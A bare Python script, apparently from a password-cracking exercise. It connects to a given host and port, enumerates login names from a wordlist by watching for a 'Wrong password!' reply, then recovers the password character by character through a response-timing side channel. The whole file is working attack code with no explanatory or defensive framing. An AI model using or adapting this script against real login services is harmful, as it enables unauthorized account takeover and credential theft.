import socket
import sys
import json
import string
import datetime

path_logins = ''
logins = []


with open(path_logins, 'r', encoding='utf-8') as f:
    for word in f:
        logins.append(word.split()[0])

chars = string.ascii_letters + string.digits

params = sys.argv
with socket.socket() as s:
    hostname = params[1]
    port = int(params[2])
    address = (hostname, port)

    s.connect(address)

    login_correct = ''
    password = ''
    x = 0
    for i in range(len(logins)):
        mes = {'login': logins[i], 'password': ' '}
        mes_str = json.dumps(mes)
        mes_encoded = mes_str.encode()
        s.send(mes_encoded)

        response = s.recv(1024)
        response = response.decode()
        response = json.loads(response)
        if response['result'] == 'Wrong password!':
            login_correct = logins[i]
            break

    while x == 0:
        for i in range(len(chars)):
            mes = {'login': login_correct, 'password': password + chars[i]}
            mes_str = json.dumps(mes)
            mes_encoded = mes_str.encode()
            s.send(mes_encoded)
            start = datetime.datetime.now()

            response = json.loads(s.recv(1024).decode())
            finish = datetime.datetime.now()
            difference = finish - start
            if response['result'] == 'Connection success!':
                print(mes_str)
                x = 1
                break
            elif difference.microseconds >= 1000:
                password = password + chars[i]
                break
